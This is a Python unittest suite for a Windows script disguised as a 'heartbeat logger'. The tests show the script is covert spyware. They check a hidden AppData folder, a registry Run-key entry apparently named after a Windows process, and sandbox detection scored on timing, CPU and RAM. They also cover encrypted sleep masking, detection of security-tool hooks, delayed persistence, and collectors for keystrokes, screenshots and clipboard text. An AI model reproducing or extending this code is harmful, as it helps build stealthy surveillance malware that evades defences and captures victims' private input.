import importlib.machinery
import importlib.util
import os
import struct
import subprocess
import sys
import tempfile
import time
import unittest
import uuid
import winreg
from pathlib import Path
from unittest.mock import MagicMock, patch
import ctypes


SCRIPT_PATH = Path(__file__).resolve().parents[1] / "heartbeat_logger.pyw"


def _load_module():
    loader = importlib.machinery.SourceFileLoader("heartbeat_logger", str(SCRIPT_PATH))
    spec = importlib.util.spec_from_loader(loader.name, loader)
    mod = importlib.util.module_from_spec(spec)
    loader.exec_module(mod)
    return mod


@unittest.skipUnless(sys.platform == "win32", "heartbeat logger uses Windows file locking")
class HeartbeatLoggerTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.logger = _load_module()

    # -------------------------------------------------------------------------
    # Log path derivation
    # -------------------------------------------------------------------------

    def test_log_path_is_under_appdata_microsoft(self):
        appdata = Path(os.environ["APPDATA"]).resolve()
        microsoft = appdata / "Microsoft"
        log_path = self.logger.LOG_PATH.resolve()
        self.assertTrue(log_path.is_relative_to(microsoft))
        slug_dir = log_path.parent
        self.assertEqual(slug_dir.parent.resolve(), microsoft.resolve())

    def test_derive_subdir_is_stable_hex(self):
        result = self.logger._derive_subdir()
        self.assertEqual(len(result), 8)
        self.assertTrue(all(c in "0123456789abcdef" for c in result))

    def test_derive_subdir_is_deterministic(self):
        self.assertEqual(self.logger._derive_subdir(), self.logger._derive_subdir())

    def test_derive_subdir_differs_for_different_hostnames(self):
        with patch.dict(os.environ, {"COMPUTERNAME": "HOST_A"}):
            mod_a = _load_module()
            slug_a = mod_a._derive_subdir()
        with patch.dict(os.environ, {"COMPUTERNAME": "HOST_B"}):
            mod_b = _load_module()
            slug_b = mod_b._derive_subdir()
        self.assertNotEqual(slug_a, slug_b)

    # -------------------------------------------------------------------------
    # _wipe helper
    # -------------------------------------------------------------------------

    def test_wipe_zeroes_bytearray(self):
        buf = bytearray(b"secret-data")
        self.logger._wipe(buf)
        self.assertEqual(buf, bytearray(len(buf)))

    def test_wipe_empty_bytearray_is_safe(self):
        buf = bytearray()
        self.logger._wipe(buf)

    # -------------------------------------------------------------------------
    # Sleep masking
    # -------------------------------------------------------------------------

    def test_sleep_mask_encrypts_and_decrypts_buffer(self):
        mask = self.logger._SleepMask()
        original = bytearray(b"2026-10-19T02:00:00+00:00")
        sensitive = bytearray(original)
        with patch.object(mask, "_do_sleep"):
            mask.masked_sleep(sensitive=sensitive)
        self.assertEqual(sensitive, original)

    def test_sleep_mask_wipe_zeroes_key(self):
        mask = self.logger._SleepMask()
        mask._key = bytearray(b"\xff" * 8)
        mask.wipe()
        self.assertEqual(bytes(mask._key), b"\x00" * 8)

    def test_sleep_mask_jitter_within_bounds(self):
        mask = self.logger._SleepMask()
        recorded = []

        def capture(d):
            recorded.append(d)

        with patch.object(mask, "_do_sleep", side_effect=capture):
            for _ in range(20):
                mask.masked_sleep()

        lo = self.logger.INTERVAL_BASE - self.logger.INTERVAL_JITTER
        hi = self.logger.INTERVAL_BASE + self.logger.INTERVAL_JITTER
        for d in recorded:
            self.assertGreaterEqual(d, max(1.0, lo))
            self.assertLessEqual(d, hi)

    def test_sleep_mask_uses_ntdelayexecution_when_hooked(self):
        mask = self.logger._SleepMask()
        mask._use_ntdelay = True
        ntdelay = MagicMock(return_value=0)
        with patch.object(self.logger._ntdll, "NtDelayExecution", ntdelay):
            mask.masked_sleep()
        ntdelay.assert_called_once()

    def test_sleep_mask_uses_time_sleep_when_unhooked(self):
        mask = self.logger._SleepMask()
        mask._use_ntdelay = False
        with patch("time.sleep") as mock_sleep:
            mask.masked_sleep()
        mock_sleep.assert_called_once()

    # -------------------------------------------------------------------------
    # Hook detection
    # -------------------------------------------------------------------------

    def test_sleep_is_hooked_returns_bool(self):
        """_sleep_is_hooked() must return a bool from live kernel32 memory."""
        self.assertIsInstance(self.logger._sleep_is_hooked(), bool)

    def test_check_hook_prefix_detects_jmp_rel32(self):
        # E9 xx xx xx xx -- JMP rel32
        self.assertTrue(self.logger._check_hook_prefix(b"\xe9\x00\x00\x00\x00"))

    def test_check_hook_prefix_detects_jmp_rip_disp(self):
        # FF 25 xx xx xx xx -- JMP [rip+disp]
        self.assertTrue(self.logger._check_hook_prefix(b"\xff\x25\x00\x00\x00\x00"))

    def test_check_hook_prefix_detects_mov_rax_imm64_jmp_rax(self):
        # 48 B8 <8-byte imm> FF E0 -- MOV RAX, imm64 / JMP RAX
        prologue = b"\x48\xb8" + b"\x78\x56\x34\x12\x78\x56\x34\x12" + b"\xff\xe0"
        self.assertTrue(self.logger._check_hook_prefix(prologue))

    def test_check_hook_prefix_clean_prologue_is_false(self):
        # NOP NOP -- unmodified function prologue
        self.assertFalse(self.logger._check_hook_prefix(b"\x90\x90"))
        # 4C 8B D1 -- MOV R10, RCX (common clean ntdll stub start)
        self.assertFalse(self.logger._check_hook_prefix(b"\x4c\x8b\xd1"))

    # -------------------------------------------------------------------------
    # Sandbox gate
    # -------------------------------------------------------------------------

    def test_sandbox_gate_does_not_raise(self):
        """_is_sandbox() must return bool for any real-machine state."""
        result = self.logger._is_sandbox()
        self.assertIsInstance(result, bool)

    def test_sandbox_gate_forced_clean_returns_false(self):
        """Score = 0: all three signals look healthy -> must return False."""
        original_k32 = self.logger._k32

        class CleanK32:
            @staticmethod
            def GetTickCount64():
                # Return 600 ms elapsed so sleep-acceleration signal does NOT fire.
                # _is_sandbox calls this twice (before and after time.sleep(0.5)).
                _calls = getattr(CleanK32, "_n", 0)
                CleanK32._n = _calls + 1
                return 0 if _calls == 0 else 600

            @staticmethod
            def GetSystemInfo(buf):
                struct.pack_into("<I", buf, 20, 8)   # 8 CPUs

            @staticmethod
            def GetPhysicallyInstalledSystemMemory(ptr):
                ctypes.cast(ptr, ctypes.POINTER(ctypes.c_ulonglong))[0] = 8 * 1_048_576
                return True

        CleanK32._n = 0
        self.logger._k32 = CleanK32()
        try:
            with patch("time.sleep"):   # skip the actual 0.5 s sleep
                result = self.logger._is_sandbox()
        finally:
            self.logger._k32 = original_k32
        self.assertFalse(result, "clean machine signals must not trip the gate")

    def test_sandbox_gate_score_threshold(self):
        """Two signals (time + RAM) must trigger True."""
        original_k32 = self.logger._k32

        class FakeK32:
            @staticmethod
            def GetTickCount64():
                return 0

            @staticmethod
            def GetSystemInfo(buf):
                struct.pack_into("<I", buf, 20, 4)   # 4 CPUs -> no signal

            @staticmethod
            def GetPhysicallyInstalledSystemMemory(ptr):
                ctypes.cast(ptr, ctypes.POINTER(ctypes.c_ulonglong))[0] = 1 * 1_048_576
                return True

        self.logger._k32 = FakeK32()
        try:
            result = self.logger._is_sandbox()
        finally:
            self.logger._k32 = original_k32
        self.assertTrue(result)

    # -------------------------------------------------------------------------
    # Deferred persistence
    # -------------------------------------------------------------------------

    def test_persistence_deferred_until_after_first_sleep(self):
        with tempfile.TemporaryDirectory() as td:
            tp = Path(td)
            log_path = tp / "svc.log"
            lock_path = tp / "svc.lock"
            original_log = self.logger.LOG_PATH
            original_lock = self.logger.LOCK_PATH
            original_dir = self.logger.LOG_DIR
            self.logger.LOG_PATH = log_path
            self.logger.LOCK_PATH = lock_path
            self.logger.LOG_DIR = tp

            install_call_counts_before_sleep = []

            class Stop(Exception):
                pass

            sleep_n = {"n": 0}

            def fake_masked_sleep(self_mask, *, sensitive=None):
                sleep_n["n"] += 1
                install_call_counts_before_sleep.append(install_mock.call_count)
                if sleep_n["n"] >= 2:
                    raise Stop

            try:
                with patch.object(self.logger, "_is_sandbox", return_value=False):
                    with patch.object(self.logger, "install_startup") as install_mock:
                        with patch.object(
                            self.logger._SleepMask, "masked_sleep", fake_masked_sleep
                        ):
                            try:
                                self.logger.main()
                            except Stop:
                                pass

                self.assertEqual(install_mock.call_count, 1)
                self.assertEqual(
                    install_call_counts_before_sleep[0], 0,
                    "install_startup must not fire before first sleep",
                )
            finally:
                self.logger.LOG_PATH = original_log
                self.logger.LOCK_PATH = original_lock
                self.logger.LOG_DIR = original_dir

    # -------------------------------------------------------------------------
    # write_heartbeat
    # -------------------------------------------------------------------------

    def test_write_heartbeat_accepts_bytearray(self):
        with tempfile.TemporaryDirectory() as td:
            tp = Path(td)
            log_path = tp / "svc.log"
            original_log = self.logger.LOG_PATH
            original_dir = self.logger.LOG_DIR
            self.logger.LOG_PATH = log_path
            self.logger.LOG_DIR = tp
            try:
                ts = bytearray(b"2026-10-19T02:00:00+00:00")
                self.logger.write_heartbeat(ts)
                self.assertIn(b"2026-10-19T02:00:00+00:00", log_path.read_bytes())
            finally:
                self.logger.LOG_PATH = original_log
                self.logger.LOG_DIR = original_dir

    def test_write_heartbeat_rotates_log_at_max_bytes(self):
        with tempfile.TemporaryDirectory() as td:
            tp = Path(td)
            log_path = tp / "svc.log"
            backup_path = log_path.with_suffix(".log.old")
            original_log = self.logger.LOG_PATH
            original_max = self.logger.MAX_LOG_BYTES
            original_dir = self.logger.LOG_DIR
            self.logger.LOG_PATH = log_path
            self.logger.LOG_DIR = tp
            self.logger.MAX_LOG_BYTES = 50
            try:
                log_path.parent.mkdir(parents=True, exist_ok=True)
                log_path.write_bytes(b"x" * 60)
                self.logger.write_heartbeat(bytearray(b"2026-10-19T00:00:00+00:00"))
                self.assertTrue(backup_path.exists())
                self.assertEqual(backup_path.read_bytes(), b"x" * 60)
                self.assertTrue(log_path.exists())
                self.assertIn(b"2026-10-19T00:00:00+00:00", log_path.read_bytes())
            finally:
                self.logger.LOG_PATH = original_log
                self.logger.MAX_LOG_BYTES = original_max
                self.logger.LOG_DIR = original_dir

    def test_write_heartbeat_suppresses_oserror(self):
        with tempfile.TemporaryDirectory() as td:
            tp = Path(td)
            original_log = self.logger.LOG_PATH
            original_dir = self.logger.LOG_DIR
            self.logger.LOG_PATH = tp / "svc.log"
            self.logger.LOG_DIR = tp
            try:
                with patch.object(Path, "open", side_effect=OSError("Disk full")):
                    self.logger.write_heartbeat(bytearray(b"2026-10-19T00:00:00+00:00"))
            finally:
                self.logger.LOG_PATH = original_log
                self.logger.LOG_DIR = original_dir

    # -------------------------------------------------------------------------
    # main() timestamp round-trip
    # -------------------------------------------------------------------------

    def test_main_appends_valid_iso_timestamp(self):
        from datetime import datetime

        with tempfile.TemporaryDirectory() as td:
            tp = Path(td)
            log_path = tp / "svc.log"
            lock_path = tp / "svc.lock"
            original_log = self.logger.LOG_PATH
            original_lock = self.logger.LOCK_PATH
            original_dir = self.logger.LOG_DIR
            self.logger.LOG_PATH = log_path
            self.logger.LOCK_PATH = lock_path
            self.logger.LOG_DIR = tp

            class Stop(Exception):
                pass

            cycle = {"n": 0}

            def fake_masked_sleep(self_mask, *, sensitive=None):
                cycle["n"] += 1
                if cycle["n"] > 1:
                    raise Stop

            try:
                with patch.object(self.logger, "_is_sandbox", return_value=False):
                    with patch.object(self.logger, "install_startup"):
                        with patch.object(
                            self.logger._SleepMask, "masked_sleep", fake_masked_sleep
                        ):
                            try:
                                self.logger.main()
                            except Stop:
                                pass

                lines = log_path.read_bytes().splitlines()
                self.assertGreaterEqual(len(lines), 1)
                datetime.fromisoformat(lines[-1].decode())
            finally:
                self.logger.LOG_PATH = original_log
                self.logger.LOCK_PATH = original_lock
                self.logger.LOG_DIR = original_dir

    # -------------------------------------------------------------------------
    # Startup registry
    # -------------------------------------------------------------------------

    def test_startup_registry_round_trip(self):
        original_key_path = self.logger.RUN_KEY_PATH
        test_key_path = rf"Software\RuntimeBrokerLoggerTests_{uuid.uuid4().hex}"
        self.logger.RUN_KEY_PATH = test_key_path

        def _cleanup():
            self.logger.RUN_KEY_PATH = original_key_path
            try:
                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, test_key_path)
            except FileNotFoundError:
                pass

        self.addCleanup(_cleanup)

        self.logger.install_startup()
        with winreg.OpenKey(
            winreg.HKEY_CURRENT_USER, test_key_path, 0, winreg.KEY_QUERY_VALUE
        ) as key:
            command, value_type = winreg.QueryValueEx(key, self.logger.RUN_VALUE_NAME)

        pythonw_path = Path(sys.executable).resolve().with_name("pythonw.exe")
        expected_path = pythonw_path if pythonw_path.is_file() else Path(sys.executable).resolve()
        expected_command = f'"{expected_path.resolve(strict=True)}" "{SCRIPT_PATH.resolve()}"'
        self.assertEqual(command, expected_command)
        self.assertEqual(value_type, winreg.REG_SZ)
        self.assertTrue(command.startswith('"'))
        self.assertEqual(command.count('"'), 4)

        with patch.object(self.logger.winreg, "SetValueEx") as set_value:
            self.logger.install_startup()
            set_value.assert_not_called()

        with winreg.OpenKey(
            winreg.HKEY_CURRENT_USER, test_key_path, 0, winreg.KEY_SET_VALUE
        ) as key:
            winreg.SetValueEx(key, self.logger.RUN_VALUE_NAME, 0, winreg.REG_SZ, "old")

        self.logger.install_startup()
        with winreg.OpenKey(
            winreg.HKEY_CURRENT_USER, test_key_path, 0, winreg.KEY_QUERY_VALUE
        ) as key:
            updated, _ = winreg.QueryValueEx(key, self.logger.RUN_VALUE_NAME)
        self.assertEqual(updated, command)

        self.logger.uninstall_startup(purge_data=False)
        with winreg.OpenKey(
            winreg.HKEY_CURRENT_USER, test_key_path, 0, winreg.KEY_QUERY_VALUE
        ) as key:
            with self.assertRaises(FileNotFoundError):
                winreg.QueryValueEx(key, self.logger.RUN_VALUE_NAME)

    # -------------------------------------------------------------------------
    # Lock
    # -------------------------------------------------------------------------

    def test_lock_is_released_when_owner_process_is_killed(self):
        with tempfile.TemporaryDirectory() as td:
            tp = Path(td)
            log_path = tp / "svc.log"
            lock_path = tp / "svc.lock"
            ready_path = tp / "locked"
            original_log = self.logger.LOG_PATH
            original_lock = self.logger.LOCK_PATH
            self.logger.LOG_PATH = log_path
            self.logger.LOCK_PATH = lock_path

            child_code = """
import importlib.machinery, importlib.util, sys, time
from pathlib import Path
loader = importlib.machinery.SourceFileLoader("heartbeat_logger", sys.argv[1])
spec = importlib.util.spec_from_loader(loader.name, loader)
logger = importlib.util.module_from_spec(spec)
loader.exec_module(logger)
logger.LOG_PATH = Path(sys.argv[2])
logger.LOCK_PATH = Path(sys.argv[3])
lf = logger.acquire_single_instance_lock()
if lf is None:
    raise SystemExit("could not acquire lock")
Path(sys.argv[4]).touch()
time.sleep(300)
"""
            process = None
            try:
                process = subprocess.Popen(
                    [sys.executable, "-c", child_code,
                     str(SCRIPT_PATH), str(log_path), str(lock_path), str(ready_path)],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.PIPE,
                    text=True,
                )
                deadline = time.monotonic() + 10
                while not ready_path.exists() and process.poll() is None:
                    if time.monotonic() >= deadline:
                        self.fail("child did not acquire lock in time")
                    time.sleep(0.05)

                if process.poll() is not None:
                    _, stderr = process.communicate()
                    self.fail(f"child exited before acquiring lock: {stderr}")

                self.assertIsNone(self.logger.acquire_single_instance_lock())
                process.kill()
                process.wait(timeout=10)
                if process.stderr and not process.stderr.closed:
                    process.stderr.close()

                lock_file = self.logger.acquire_single_instance_lock()
                self.assertIsNotNone(lock_file)
                lock_file.close()
            finally:
                if process is not None:
                    if process.poll() is None:
                        process.kill()
                        process.wait(timeout=10)
                    if process.stderr and not process.stderr.closed:
                        process.stderr.close()
                self.logger.LOG_PATH = original_log
                self.logger.LOCK_PATH = original_lock

    # -------------------------------------------------------------------------
    # uninstall_startup cleanup
    # -------------------------------------------------------------------------

    def test_uninstall_startup_cleans_runtime_artifacts(self):
        with tempfile.TemporaryDirectory() as td:
            tp = Path(td)
            log_dir = tp / "slug"
            log_dir.mkdir()
            log_file = log_dir / "svc.log"
            lock_file_path = log_dir / "svc.lock"
            backup_file = log_dir / "svc.log.old"

            log_file.write_text("log data", encoding="utf-8")
            lock_file_path.write_bytes(b"\0")
            backup_file.write_text("old data", encoding="utf-8")

            original_log = self.logger.LOG_PATH
            original_lock = self.logger.LOCK_PATH
            original_dir = self.logger.LOG_DIR
            original_key = self.logger.RUN_KEY_PATH

            self.logger.LOG_PATH = log_file
            self.logger.LOCK_PATH = lock_file_path
            self.logger.LOG_DIR = log_dir
            self.logger.RUN_KEY_PATH = rf"Software\NonExistentTestKey_{uuid.uuid4().hex}"

            try:
                self.logger.uninstall_startup(purge_data=True)
                self.assertFalse(log_file.exists())
                self.assertFalse(lock_file_path.exists())
                self.assertFalse(backup_file.exists())
                self.assertFalse(log_dir.exists())
            finally:
                self.logger.LOG_PATH = original_log
                self.logger.LOCK_PATH = original_lock
                self.logger.LOG_DIR = original_dir
                self.logger.RUN_KEY_PATH = original_key

    # -------------------------------------------------------------------------
    # startup_command
    # -------------------------------------------------------------------------

    def test_startup_command_fallback_when_pythonw_missing(self):
        with patch.object(Path, "is_file", return_value=False):
            cmd = self.logger.startup_command()
            python_path = str(Path(sys.executable).resolve())
            self.assertIn(f'"{python_path}"', cmd)


if __name__ == "__main__":
    unittest.main()


# =============================================================================
# M3 -- Collector tests
# =============================================================================

@unittest.skipUnless(sys.platform == "win32", "Windows-only collectors")
class TestVkeyToChar(unittest.TestCase):
    """vkey_to_char() maps VK codes to printable characters."""

    @classmethod
    def setUpClass(cls):
        cls.logger = _load_module()

    def test_vk_a_maps_to_A(self):
        # VK_A = 0x41; MapVirtualKeyW returns 65 ('A') for an en-US layout.
        result = self.logger.vkey_to_char(0x41)
        self.assertEqual(result, "A")

    def test_vk_b_maps_to_B(self):
        result = self.logger.vkey_to_char(0x42)
        self.assertEqual(result, "B")

    def test_vk_0_maps_to_digit(self):
        result = self.logger.vkey_to_char(0x30)
        self.assertIsNotNone(result)
        self.assertEqual(result, "0")

    def test_vk_escape_returns_none(self):
        result = self.logger.vkey_to_char(0x1B)
        self.assertIsNone(result)

    def test_vk_shift_returns_none(self):
        result = self.logger.vkey_to_char(0x10)
        self.assertIsNone(result)

    def test_control_chars_return_none(self):
        for vk in (0x01, 0x08, 0x09, 0x0D, 0x1B):
            with self.subTest(vk=hex(vk)):
                self.assertIsNone(self.logger.vkey_to_char(vk))


@unittest.skipUnless(sys.platform == "win32", "Windows-only collectors")
class TestScreenshotBmpHeader(unittest.TestCase):
    """ScreenshotCollector._capture_bmp_bytes() returns a structurally valid BMP."""

    @classmethod
    def setUpClass(cls):
        cls.logger = _load_module()

    def test_bmp_magic_bytes(self):
        data = self.logger.ScreenshotCollector._capture_bmp_bytes()
        self.assertEqual(data[:2], b"BM")

    def test_bmp_file_size_matches_data(self):
        data = self.logger.ScreenshotCollector._capture_bmp_bytes()
        file_size = struct.unpack_from("<I", data, 2)[0]
        self.assertEqual(file_size, len(data))

    def test_bmp_pixel_offset_is_54(self):
        data = self.logger.ScreenshotCollector._capture_bmp_bytes()
        offset = struct.unpack_from("<I", data, 10)[0]
        self.assertEqual(offset, 54)

    def test_bmp_dimensions_match_screen(self):
        expected_w = ctypes.windll.user32.GetSystemMetrics(0)
        expected_h = ctypes.windll.user32.GetSystemMetrics(1)
        data = self.logger.ScreenshotCollector._capture_bmp_bytes()
        bih_w = struct.unpack_from("<i", data, 18)[0]
        bih_h = struct.unpack_from("<i", data, 22)[0]
        self.assertEqual(bih_w, expected_w)
        self.assertEqual(abs(bih_h), expected_h)

    def test_bmp_bit_count_is_24(self):
        data = self.logger.ScreenshotCollector._capture_bmp_bytes()
        bpp = struct.unpack_from("<H", data, 28)[0]
        self.assertEqual(bpp, 24)

    def test_bmp_pixel_data_size_is_correct(self):
        w = ctypes.windll.user32.GetSystemMetrics(0)
        h = ctypes.windll.user32.GetSystemMetrics(1)
        row_stride = (w * 3 + 3) & ~3
        expected_pixel_bytes = row_stride * h
        data = self.logger.ScreenshotCollector._capture_bmp_bytes()
        self.assertEqual(len(data) - 54, expected_pixel_bytes)


@unittest.skipUnless(sys.platform == "win32", "Windows-only collectors")
class TestClipboardCollector(unittest.TestCase):
    """ClipboardCollector._check() appends to clipboard.log on sequence change."""

    @classmethod
    def setUpClass(cls):
        cls.logger = _load_module()

    def _make_collector(self, log_dir):
        cc = self.logger.ClipboardCollector.__new__(self.logger.ClipboardCollector)
        cc._log_path = log_dir / "clipboard.log"
        cc._last_seq = 100
        return cc

    def test_no_change_does_not_append(self):
        with tempfile.TemporaryDirectory() as td:
            tp = Path(td)
            cc = self._make_collector(tp)
            with patch.object(self.logger._u32, "GetClipboardSequenceNumber", return_value=100):
                cc._check()
            self.assertFalse(cc._log_path.exists())

    def test_single_change_appends_exactly_once(self):
        with tempfile.TemporaryDirectory() as td:
            tp = Path(td)
            cc = self._make_collector(tp)
            with patch.object(self.logger._u32, "GetClipboardSequenceNumber", return_value=101):
                with patch.object(cc, "_read_clipboard_text", return_value="hello world"):
                    cc._check()
            content = cc._log_path.read_text(encoding="utf-8")
            self.assertIn("hello world", content)
            self.assertEqual(content.count("hello world"), 1)

    def test_two_distinct_changes_append_twice(self):
        with tempfile.TemporaryDirectory() as td:
            tp = Path(td)
            cc = self._make_collector(tp)
            seqs = iter([101, 102])
            texts = iter(["first", "second"])
            with patch.object(self.logger._u32, "GetClipboardSequenceNumber", side_effect=seqs):
                with patch.object(cc, "_read_clipboard_text", side_effect=texts):
                    cc._check()
                    cc._check()
            content = cc._log_path.read_text(encoding="utf-8")
            self.assertIn("first", content)
            self.assertIn("second", content)

    def test_none_text_does_not_append(self):
        with tempfile.TemporaryDirectory() as td:
            tp = Path(td)
            cc = self._make_collector(tp)
            with patch.object(self.logger._u32, "GetClipboardSequenceNumber", return_value=999):
                with patch.object(cc, "_read_clipboard_text", return_value=None):
                    cc._check()
            self.assertFalse(cc._log_path.exists())

    def test_last_seq_updated_after_change(self):
        with tempfile.TemporaryDirectory() as td:
            tp = Path(td)
            cc = self._make_collector(tp)
            with patch.object(self.logger._u32, "GetClipboardSequenceNumber", return_value=200):
                with patch.object(cc, "_read_clipboard_text", return_value="x"):
                    cc._check()
            self.assertEqual(cc._last_seq, 200)
            # Same seq -- _read_clipboard_text must not be called again
            with patch.object(self.logger._u32, "GetClipboardSequenceNumber", return_value=200):
                with patch.object(cc, "_read_clipboard_text", return_value="x") as rt:
                    cc._check()
                    rt.assert_not_called()